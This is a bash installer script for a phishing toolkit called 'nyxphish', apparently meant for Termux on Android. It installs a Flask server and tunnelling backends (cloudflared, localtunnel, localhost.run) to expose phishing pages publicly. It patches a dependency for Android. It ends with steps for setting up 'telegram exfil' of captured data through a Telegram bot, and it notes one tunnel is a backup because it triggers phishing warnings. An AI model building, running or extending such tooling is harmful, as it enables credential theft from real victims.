#!/data/data/com.termux/files/usr/bin/bash
# nyxphish installer — termux edition
R="\033[1;31m"; G="\033[1;32m"; Y="\033[1;33m"; C="\033[1;36m"; W="\033[1;37m"; N="\033[0m"

echo -e "${C}[*] nyxphish installer — setting up dependencies${N}"

# detect environment
if [ -d "/data/data/com.termux" ]; then
    PKG="pkg"
    echo -e "${G}[+] termux environment detected${N}"
else
    PKG="apt"
    echo -e "${Y}[*] standard linux detected — using apt${N}"
fi

echo -e "${C}[*] updating packages...${N}"
$PKG update -y && $PKG upgrade -y

echo -e "${C}[*] installing python, cloudflared, openssh, wget, curl...${N}"
$PKG install python cloudflared openssh wget curl -y 2>/dev/null || {
    # cloudflared may be missing from some repos — fall back to manual binary
    $PKG install python openssh wget curl -y
    echo -e "${Y}[*] cloudflared not in repo, downloading binary...${N}"
    ARCH=$(uname -m)
    case "$ARCH" in
        aarch64|arm64) CF_ARCH="arm64" ;;
        armv7l|arm)    CF_ARCH="arm" ;;
        x86_64|amd64)  CF_ARCH="amd64" ;;
        *)             CF_ARCH="arm64" ;;
    esac
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH" -O cloudflared
    chmod +x cloudflared
}

echo -e "${C}[*] installing python deps (flask, requests, qrcode)...${N}"
pip install flask requests qrcode --quiet

# localtunnel (backup backend only — shows phishing interstitial in 2026)
if ! command -v lt >/dev/null 2>&1; then
    echo -e "${C}[*] installing localtunnel via npm (backup backend)...${N}"
    $PKG install nodejs -y
    npm install -g localtunnel
    OPENURL="$(npm root -g)/localtunnel/node_modules/openurl/openurl.js"
    if [ -f "$OPENURL" ] && grep -q "Unsupported platform" "$OPENURL"; then
        sed -i "s|throw new Error('Unsupported platform: ' + process.platform);|return; /* patched for android */|" "$OPENURL"
        echo -e "${G}[+] openurl patched for android/termux${N}"
    fi
fi

echo -e "${G}[+] tunnel backends: cloudflared (primary), localhost.run (ssh), localtunnel (backup)${N}"

chmod +x nyxphish.py

echo ""
echo -e "${G}════════════════════════════════════════════${N}"
echo -e "${G} [+] installation complete${N}"
echo -e "${G}════════════════════════════════════════════${N}"
echo -e "${W} run the tool:${N}"
echo -e "   ${C}python nyxphish.py${N}"
echo ""
echo -e "${W} optional — telegram exfil:${N}"
echo -e "   1. message ${C}@BotFather${N} → /newbot → copy token"
echo -e "   2. message ${C}@userinfobot${N} → copy your chat id"
echo -e "   3. run nyxphish → option ${C}[2] telegram config${N}"
